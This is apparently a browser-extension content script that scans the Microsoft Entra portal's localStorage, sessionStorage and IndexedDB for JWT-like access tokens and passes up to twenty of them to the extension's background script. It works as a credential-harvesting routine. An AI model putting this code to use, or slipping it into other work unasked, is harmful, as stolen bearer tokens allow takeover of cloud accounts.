(() => {
  const JWT_PATTERN = /\b[A-Za-z0-9_-]{1,2000}\.[A-Za-z0-9_-]{1,8000}\.[A-Za-z0-9_-]{1,2000}\b/g;
  const MAX_STORAGE_VALUE_LENGTH = 300000;
  const MAX_TOKENS = 20;
  const MAX_JSON_DEPTH = 5;
  const MAX_ATTEMPTS = 45;
  const MAX_INDEXED_DB_DATABASES = 12;
  const MAX_INDEXED_DB_STORES = 40;
  const MAX_INDEXED_DB_RECORDS_PER_STORE = 100;
  let attempts = 0;
  let isScanning = false;

  async function scan() {
    if (isScanning) {
      return;
    }
    isScanning = true;
    attempts += 1;
    try {
      const includeIndexedDb = attempts <= 3 || attempts % 5 === 0;
      const tokens = await collectPortalTokens(includeIndexedDb);
      if (tokens.length) {
        chrome.runtime.sendMessage(
          {
            action: "capturePortalTokens",
            tokens,
            source: `entra.microsoft.com storage: ${location.hash.slice(0, 120)}`
          },
          () => {
            void chrome.runtime.lastError;
          }
        );
      }
    } finally {
      isScanning = false;
      if (attempts >= MAX_ATTEMPTS) {
        clearInterval(interval);
      }
    }
  }

  async function collectPortalTokens(includeIndexedDb) {
    const tokens = new Set();
    collectStorageTokens(window.localStorage, tokens);
    collectStorageTokens(window.sessionStorage, tokens);
    if (includeIndexedDb) {
      await collectIndexedDbTokens(tokens);
    }
    return [...tokens].slice(0, MAX_TOKENS);
  }

  function collectStorageTokens(storage, tokens) {
    try {
      for (let index = 0; index < storage.length && tokens.size < MAX_TOKENS; index += 1) {
        const key = storage.key(index);
        if (!key) continue;
        addTokensFromValue(storage.getItem(key), tokens);
      }
    } catch {
      // Some portal frames may deny storage access. The next scan can still succeed from another frame.
    }
  }

  async function collectIndexedDbTokens(tokens) {
    if (
      tokens.size >= MAX_TOKENS ||
      !window.indexedDB ||
      typeof window.indexedDB.databases !== "function"
    ) {
      return;
    }

    let databases;
    try {
      databases = await window.indexedDB.databases();
    } catch {
      return;
    }

    for (const databaseInfo of databases.slice(0, MAX_INDEXED_DB_DATABASES)) {
      const databaseName = databaseInfo && databaseInfo.name;
      if (!databaseName || tokens.size >= MAX_TOKENS) {
        continue;
      }

      const database = await openDatabase(databaseName);
      if (!database) {
        continue;
      }

      try {
        const storeNames = Array.from(database.objectStoreNames).slice(0, MAX_INDEXED_DB_STORES);
        for (const storeName of storeNames) {
          if (tokens.size >= MAX_TOKENS) {
            break;
          }
          await collectObjectStoreTokens(database, storeName, tokens);
        }
      } finally {
        database.close();
      }
    }
  }

  function openDatabase(databaseName) {
    return new Promise((resolve) => {
      try {
        const request = window.indexedDB.open(databaseName);
        request.onerror = () => resolve(undefined);
        request.onblocked = () => resolve(undefined);
        request.onsuccess = () => resolve(request.result);
      } catch {
        resolve(undefined);
      }
    });
  }

  function collectObjectStoreTokens(database, storeName, tokens) {
    return new Promise((resolve) => {
      let finished = false;
      let recordsRead = 0;

      function finish() {
        if (!finished) {
          finished = true;
          resolve();
        }
      }

      try {
        const transaction = database.transaction(storeName, "readonly");
        const store = transaction.objectStore(storeName);
        const request = store.openCursor();

        request.onerror = finish;
        transaction.onerror = finish;
        transaction.onabort = finish;
        transaction.oncomplete = finish;
        request.onsuccess = () => {
          if (finished) {
            return;
          }

          if (tokens.size >= MAX_TOKENS || recordsRead >= MAX_INDEXED_DB_RECORDS_PER_STORE) {
            try {
              transaction.abort();
            } catch {
              // The transaction may have already completed.
            }
            finish();
            return;
          }

          const cursor = request.result;
          if (!cursor) {
            finish();
            return;
          }

          recordsRead += 1;
          addTokensFromValue(cursor.value, tokens);
          try {
            cursor.continue();
          } catch {
            finish();
          }
        };
      } catch {
        finish();
      }
    });
  }

  function addTokensFromValue(value, tokens, depth = 0) {
    if (tokens.size >= MAX_TOKENS || value === undefined || value === null || depth > MAX_JSON_DEPTH) {
      return;
    }
    if (typeof value === "string") {
      addTokensFromText(value, tokens);
      return;
    }
    if (Array.isArray(value)) {
      for (const item of value) {
        addTokensFromValue(item, tokens, depth + 1);
      }
      return;
    }
    if (typeof value === "object") {
      for (const item of Object.values(value)) {
        addTokensFromValue(item, tokens, depth + 1);
      }
    }
  }

  function addTokensFromText(value, tokens) {
    if (!value || value.length > MAX_STORAGE_VALUE_LENGTH || tokens.size >= MAX_TOKENS) {
      return;
    }
    for (const match of value.matchAll(JWT_PATTERN)) {
      tokens.add(match[0]);
      if (tokens.size >= MAX_TOKENS) {
        return;
      }
    }
    const parsed = parseJson(value);
    if (parsed !== undefined) {
      addTokensFromValue(parsed, tokens, 1);
    }
  }

  function parseJson(value) {
    const trimmed = value.trim();
    if (!trimmed.startsWith("{") && !trimmed.startsWith("[")) {
      return undefined;
    }
    try {
      return JSON.parse(trimmed);
    } catch {
      return undefined;
    }
  }

  scan();
  const interval = setInterval(scan, 2000);
  window.addEventListener("hashchange", scan);
  document.addEventListener("visibilitychange", () => {
    if (!document.hidden) scan();
  });
})();
